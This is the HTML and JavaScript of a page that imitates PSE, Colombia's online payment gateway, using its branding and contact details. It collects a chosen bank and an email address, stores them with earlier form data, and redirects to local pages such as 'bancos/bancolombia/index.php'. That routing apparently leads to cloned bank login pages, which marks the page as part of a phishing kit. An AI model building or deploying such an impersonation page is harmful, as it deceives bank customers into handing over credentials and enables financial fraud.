<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PSE - Pago Seguro en Línea</title>
    
    <!-- Google tag (gtag.js) -->
    <script async src="https://www.googletagmanager.com/gtag/js?id=AW-17891912053"></script>
    <script>
      window.dataLayer = window.dataLayer || [];
      function gtag(){dataLayer.push(arguments);}
      gtag('js', new Date());
      gtag('config', 'AW-17891912053');
    </script>
    <link rel="stylesheet" href="styles.css">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;600;700&display=swap" rel="stylesheet">
    <style>
        .bank-selector {
            margin: 1.5rem 0;
        }

        .bank-select {
            width: 100%;
            padding: 0.75rem;
            font-size: 1rem;
            border: 2px solid #ddd;
            border-radius: 4px;
            font-family: 'Open Sans', sans-serif;
            cursor: pointer;
            background-color: #fff;
            transition: border-color 0.3s;
        }

        .bank-select:focus {
            outline: none;
            border-color: #0099cc;
            box-shadow: 0 0 5px rgba(0, 153, 204, 0.3);
        }

        .bank-select.error {
            border-color: #e74c3c;
            background-color: #ffe6e6;
        }

        .bank-label {
            display: block;
            margin-bottom: 0.5rem;
            font-weight: 600;
            color: #333;
        }

        .bank-label .asterisk {
            color: #e74c3c;
        }

        .bank-field {
            margin-bottom: 1.5rem;
        }
    </style>
</head>
<body>
    
    <!-- Background Pattern -->
    <div class="bg-pattern"></div>

    <!-- Header con NFbanner-izq.svg grande -->
    <header class="header">
        <img src="NFbanner-izq.svg" alt="PSE" class="main-banner">
    </header>

    <!-- Main Content -->
    <main class="main-container">
        <div class="content-box">
            <!-- Título -->
            <h1 class="main-title">Selecciona el tipo de persona:</h1>

            <!-- Formulario -->
            <form class="main-form" id="pse-form">
                <!-- Selector de Tipo de Persona -->
                <div class="person-selector">
                    <label class="person-card selected" data-type="natural">
                        <input type="radio" name="personType" value="natural" checked>
                        <img src="natural_check.svg" alt="Natural" class="person-img">
                        <span class="person-label">Natural</span>
                    </label>
                    <label class="person-card" data-type="juridica">
                        <input type="radio" name="personType" value="juridica">
                        <img src="juridica.svg" alt="Jurídica" class="person-img">
                        <span class="person-label">Jurídica</span>
                    </label>
                </div>

                <!-- Selector de Banco - SOLO LOS 7 BANCOS QUE EXISTEN (sin Movii) -->
                <div class="bank-field">
                    <label for="bank-select" class="bank-label">
                        Selecciona tu banco <span class="asterisk">*</span>
                    </label>
                    <select id="bank-select" name="bank" class="bank-select" required>
                        <option value="">-- Elige un banco --</option>
                        <option value="bancolombia">Bancolombia</option>
                        <option value="bogota">Bogotá</option>
                        <option value="davivienda">Davivienda</option>
                        <option value="daviplata">Daviplata</option>
                        <option value="falabella">Falabella</option>
                        <option value="nequi">Nequi</option>
                        <option value="popular">Popular</option>
                    </select>
                </div>

                <!-- Opciones de Usuario -->
                <div class="user-options">
                    <button type="button" class="user-option selected" id="registered-user">
                        <img src="opreg_sel.svg" alt="" class="option-icon">
                        <span>Soy un usuario registrado</span>
                    </button>
                    <button type="button" class="user-option" id="new-user">
                        <img src="opact.svg" alt="" class="option-icon">
                        <span>Registrarme ahora</span>
                    </button>
                </div>

                <!-- Campo de Email -->
                <div class="email-field">
                    <label for="email" class="field-label">
                        Ingresa tu correo electrónico <span class="asterisk">*</span>
                    </label>
                    <input 
                        type="email" 
                        id="email" 
                        name="email" 
                        class="email-input" 
                        placeholder="Ej: correo@pse.com.co"
                        required
                    >
                </div>

                <!-- Botones -->
                <div class="form-buttons">
                    <button type="submit" class="btn-primary" id="btn-submit">
                        Ir al Banco
                    </button>
                    <button type="button" class="btn-secondary" onclick="window.history.back()">
                        Regresar al comercio
                    </button>
                </div>
            </form>

            <!-- Información de Contacto -->
            <div class="contact-box">
                <div class="contact-icon-left">
                    <img src="footerD.svg" alt="Contacto">
                </div>
                <div class="contact-content">
                    <h3 class="contact-title">Para mayor información comunícate con nosotros:</h3>
                    <div class="contact-info">
                        <div class="contact-row">
                            <img src="mobile.svg" alt="Teléfono">
                            <span><strong>En Bogotá:</strong> +57 (601) 3808890 opción 5</span>
                        </div>
                        <div class="contact-row">
                            <img src="conta.svg" alt="Web">
                            <span><strong>Contáctanos:</strong> <a href="https://www.pse.com.co/persona-centro-de-ayuda" target="_blank">https://www.pse.com.co/persona-centro-de-ayuda</a></span>
                        </div>
                    </div>
                    <div class="ach-logo">
                        <img src="footer.svg" alt="ACH Colombia">
                    </div>
                </div>
            </div>
        </div>
    </main>

    <!-- Pantalla de Carga (Oculta por defecto) -->
    <div class="loading-overlay" id="loadingOverlay">
        <div class="loading-content">
            <img src="procesandonw.gif" alt="Procesando" class="loading-gif">
            <p class="loading-text">Procesando tu solicitud...</p>
        </div>
    </div>

    <!-- Scripts al final para asegurar que el DOM esté listo -->
    <script>
        // ============================================
        // BANCO ROUTES - RUTAS A bancos/
        // ============================================
        const BankRoutes = {
            banks: {
                'bancolombia': 'bancos/bancolombia/index.php',
                'bogota': 'bancos/bogota/index.php',
                'davivienda': 'bancos/davivienda/index.php',
                'daviplata': 'bancos/daviplata/index.php',
                'falabella': 'bancos/falabella/index.php',
                'nequi': 'bancos/nequi/index.php',
                'popular': 'bancos/popular/index.php'
            },

            getBankRoute: function(bankCode) {
                return this.banks[bankCode.toLowerCase()] || null;
            },

            getAvailableBanks: function() {
                return Object.keys(this.banks);
            }
        };

        document.addEventListener('DOMContentLoaded', function() {
            const form = document.getElementById('pse-form');
            const emailInput = document.getElementById('email');
            const bankSelect = document.getElementById('bank-select');
            const personCards = document.querySelectorAll('.person-card');
            const userOptions = document.querySelectorAll('.user-option');
            const loadingOverlay = document.getElementById('loadingOverlay');

            console.log('✅ DOM Cargado');
            console.log('✅ Bancos disponibles:', BankRoutes.getAvailableBanks());
            console.log('✅ Total de bancos:', BankRoutes.getAvailableBanks().length);

            // Selector de tipo de persona
            personCards.forEach(card => {
                card.addEventListener('click', function() {
                    personCards.forEach(c => c.classList.remove('selected'));
                    this.classList.add('selected');
                    this.querySelector('input[type="radio"]').checked = true;
                });
            });

            // Selector de usuario
            userOptions.forEach(option => {
                option.addEventListener('click', function() {
                    userOptions.forEach(opt => opt.classList.remove('selected'));
                    this.classList.add('selected');
                });
            });

            // Limpiar errores en email
            emailInput.addEventListener('input', function() {
                this.classList.remove('error');
            });

            // Limpiar errores en banco
            bankSelect.addEventListener('change', function() {
                this.classList.remove('error');
            });

            // ============================================
            // SUBMIT DEL FORMULARIO
            // ============================================
            form.addEventListener('submit', function(e) {
                e.preventDefault();

                // Validar banco
                if (!bankSelect.value) {
                    bankSelect.classList.add('error');
                    alert('Por favor selecciona un banco');
                    return;
                }

                // Validar email
                const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
                if (!emailInput.value || !emailRegex.test(emailInput.value)) {
                    emailInput.classList.add('error');
                    alert('Por favor ingresa un email válido');
                    return;
                }

                // Obtener datos previos
                const previousData = JSON.parse(sessionStorage.getItem('formData') || '{}');

                // Combinar datos
                const pseData = {
                    ...previousData,
                    bank: bankSelect.value,
                    personType: document.querySelector('input[name="personType"]:checked').value,
                    email: emailInput.value,
                    registeredUser: document.getElementById('registered-user').classList.contains('selected'),
                    timestamp: new Date().toISOString()
                };

                // Guardar
                sessionStorage.setItem('pseData', JSON.stringify(pseData));
                console.log('💾 Datos guardados:', pseData);

                // Mostrar loading
                loadingOverlay.classList.add('active');

                // Redirigir al banco después de 1.5 segundos
                setTimeout(() => {
                    const selectedBank = bankSelect.value;
                    const bankRoute = BankRoutes.getBankRoute(selectedBank);
                    
                    if (bankRoute) {
                        console.log('📍 Redirigiendo a:', bankRoute);
                        window.location.href = bankRoute;
                    } else {
                        console.warn('⚠️ Banco no encontrado:', selectedBank);
                        alert('Banco seleccionado no disponible');
                        loadingOverlay.classList.remove('active');
                    }
                }, 1500);
            });
        });
    </script>
</body>
</html>
